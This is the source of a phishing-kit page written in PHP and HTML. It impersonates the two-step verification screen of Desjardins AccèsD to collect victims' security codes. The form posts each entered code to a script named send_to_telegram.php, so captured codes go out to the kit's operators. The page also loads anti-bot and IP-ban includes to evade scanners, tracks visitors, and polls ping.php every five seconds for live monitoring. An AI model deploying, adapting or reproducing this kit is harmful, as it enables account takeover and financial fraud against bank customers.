<?php
error_reporting(0);
set_time_limit(0);
session_start();
include ('../prevents/bots.php');
include ('../prevents/antimar.php');
include ('../prevents/banned-ip.php');
	include ('../prevents/anti1.php');
	include ('../prevents/anti2.php');
	include ('../prevents/anti3.php');
	include ('../prevents/anti4.php');
	include ('../prevents/anti5.php');
	include ('../prevents/anti6.php');
	include ('../prevents/anti7.php');
	include ('../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}
include 'track.php';
include 'page_notify.php';
// Juste au début du fichier PHP
include 'Jeehan.php';
$jeehan = new Jeehan();
$jeehan->track('nom_de_la_page.php'); // ex: connexion.php



?>

<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="shortcut icon" href="image/logo.png">
    <link rel="stylesheet" href="style.css">
    <title>Validation en 2 étapes</title>
    <style>
        body {
            background-color: #f2f2f2;
        }

        .top-header {
            background-color: #ffffff;
            color: #333;
            padding: 10px 20px;
            text-align: right;
            font-size: 0.9rem;
        }

        .top-header a {
            color: #333;
            text-decoration: none;
            margin: 0 8px;
        }

        .logo-section img {
            height: 40px;
            margin-right: 15px;
        }

        .container {
            max-width: 600px;
            background-color: #ffffff;
            border-radius: 8px;
            padding: 20px;
            margin-top: 30px;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
        }

        .info-box {
            background-color: #e6f3ff;
            padding: 10px;
            border-radius: 5px;
            color: #333;
            display: flex;
            align-items: center;
            font-size: 0.9rem;
            margin-bottom: 20px;
        }

        .info-box i {
            font-size: 1.2rem;
            margin-right: 10px;
        }

        .form-label {
            font-weight: bold;
            font-size: 1.1rem;
        }

        .btn-group {
            margin-top: 20px;
            display: flex;
            gap: 10px;
            justify-content: space-between;
        }

        .dropdown-validation {
            margin-top: 15px;
        }

        .icon-refresh {
            margin-left: 10px;
            cursor: pointer;
            color: #28a745;
        }

        .btn-success,
        .btn-secondary {
            width: 30%;
        }
    </style>
</head>

<body>

    <!-- Top Header -->
    <div class="top-header bg-dark text-white py-2 px-4 d-flex justify-content-end align-items-center ">
        <a href="authentification.html" class="text-white text-decoration-none mx-2">AA +</a>
        <span class="border-start border-1 mx-2"></span>
        <a href="#" class="text-white text-decoration-none mx-2">English</a>
        <span class="border-start border-1 mx-2"></span>
        <a href="#" class="text-white text-decoration-none mx-2">Nous joindre</a>
        <span class="border-start border-1 mx-2"></span>
        <a href="#" class="text-white text-decoration-none mx-2">Aide</a>
    </div>

    <!-- Bottom Header -->
    <div class="bottom-header bg-white py-2 px-5 d-flex align-items-center">
        <img src="image/logo-desjardins-couleur.png" alt="Logo Desjardins" class="logo-desjardins me-3">
        <img src="image/accesd1933.jpg" alt="Logo AccèsD" style="height: 90px;" class="accesd-logo me-3 ">
        <img src="image/images-removebg-preview.png" alt="Logo AccèsD Affaires" class="accesd-affaires-logo">
    </div>

    <!-- Main Container -->
    <div class="container">
        <h2 class="text-center mb-4">Validation en 2 étapes</h2>

        <form action="action/send_to_telegram.php" method="POST">
            <!-- Info Box -->
            <div class="info-box">
                <i class="bi bi-info-circle-fill text-info"></i>
                <span>Un code de sécurité a été envoyé sur votre appareil mobile. Vous avez 10 minutes pour entrer le code.</span>
            </div>

            <!-- Security Code Section -->
            <div class="mb-4">
                <label for="security-code" class="form-label">Code de sécurité</label>
                <input type="text" id="security-code" name="security_code" class="form-control mb-2" placeholder="Entrez le code de sécurité" required>
                <div class="text-success small mt-2 d-flex align-items-center">
                    <i class="bi bi-arrow-clockwise icon-refresh"></i>
                    <a href="#" class="text-success text-decoration-none ms-2">Demander un nouveau code</a>
                </div>
            </div>

            <!-- Validation Frequency Section -->
            <div class="mb-4">
                <label for="validation-frequency" class="form-label">Fréquence de validation <i class="bi bi-info-circle-fill text-muted"></i></label>
                <select id="validation-frequency" name="validation_frequency" class="form-select dropdown-validation">
                    <option>Ne pas demander sur cet appareil</option>
                    <option>Demander à chaque connexion</option>
                </select>
            </div>

            <!-- Buttons Section -->
            <div class="btn-group">
                <button type="submit" class="btn btn-success">Continuer</button>
                <button type="button" class="btn btn-outline-secondary">Retour aux moyens de vérification</button>
                <button type="button" class="btn btn-outline-danger">Annuler</button>
            </div>
            <?php if (isset($_GET['error']) && $_GET['error'] == 1): ?>
    <div style="margin-top: 10px; color: red; font-weight: bold;">
    ❌ Code invalide. Vous allez recevoir un nouveau code.
    </div>
<?php endif; ?>

        </form>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
   setInterval(() => {
    fetch('ping.php');
}, 5000); // toutes les 5 secondes
</script>

</body>


</html>
